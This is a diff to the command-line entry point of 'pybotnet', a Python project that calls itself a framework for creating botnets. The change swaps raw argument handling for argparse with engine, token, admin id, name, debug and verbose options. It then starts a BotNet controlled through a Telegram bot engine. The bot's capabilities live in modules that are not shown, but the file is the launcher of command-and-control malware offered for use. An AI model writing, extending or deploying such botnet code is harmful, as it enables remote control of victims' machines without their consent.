@@ -1,27 +1,59 @@
+import argparse
+
 from . import *
 
-"""run pybotnet by (`python -m pybotnet [TELEGRAM_TOKEN] [ADMIN_CHAT_ID] [BOT NAME]`)"""
+"""run pybotnet by (`python -m pybotnet -t [TELEGRAM_TOKEN] -i [ADMIN_CHAT_ID] -n [BOT NAME]`)"""
+
+ENGINE_NAMES = ["telegram"]
 
 if __name__ == "__main__":
-    import sys
 
-    argv = sys.argv
+    parser = argparse.ArgumentParser(
+        prog="pybotnet",
+        description="pybotnet - a python framework for creating botnet..."
+    )
 
-    if len(argv) >= 3:
-        TELEGRAM_TOKEN = argv[1]
-        ADMIN_CHAT_ID = argv[2]
+    parser.add_argument(
+        "-e",
+        "--engine",
+        help="Engines transfer messages between admin and botnet",
+        required=False,
+        choices=ENGINE_NAMES,
+        default="telegram",
+    )
+    parser.add_argument(
+        "-t",
+        "--token",
+        help="bot token",
+        required=False,
+    )
+    parser.add_argument(
+        "-i", "--id", help="admin id", required=False
+    )
+    parser.add_argument("-n", "--name", help="bot name", required=False, default="...")
+    parser.add_argument(
+        "-d", "--debug", help="debug mode", required=False, action="store_true"
+    )
+    parser.add_argument(
+        "-v", "--verbose", help="verbose mode", required=False, action="store_true"
+    )
 
-        if len(argv) == 4:
-            BOT_NAME = argv[3]
-        else:
-            BOT_NAME = "None"
+    args = parser.parse_args()
 
-        telegram_engine = TelegramEngine(
-            token=TELEGRAM_TOKEN, admin_chat_id=ADMIN_CHAT_ID
-        )
+    if args.engine == "telegram":
+        if args.verbose:
+            print("[+] using telegram engine")
 
-        BotNet(telegram_engine,  bot_name=BOT_NAME).run()
+        if args.token is None:
+            print("[-] telegram token is required")
+            exit(1)
+        if args.id is None:
+            print("[-] admin chat id is required")
+            exit(1)
 
-    else:
-        print("invalid syntax, use: `python3 -m pybotnet [TELEGRAM_TOKEN] [ADMIN_CHAT_ID] [BOT_NAME]`")
-        exit(1)
+        engine = TelegramEngine(token=args.token, admin_chat_id=args.id)
+
+    if args.verbose:
+        print("[+] running botnet...")
+
+    BotNet(engine, bot_name=args.name, debug=args.debug).run()
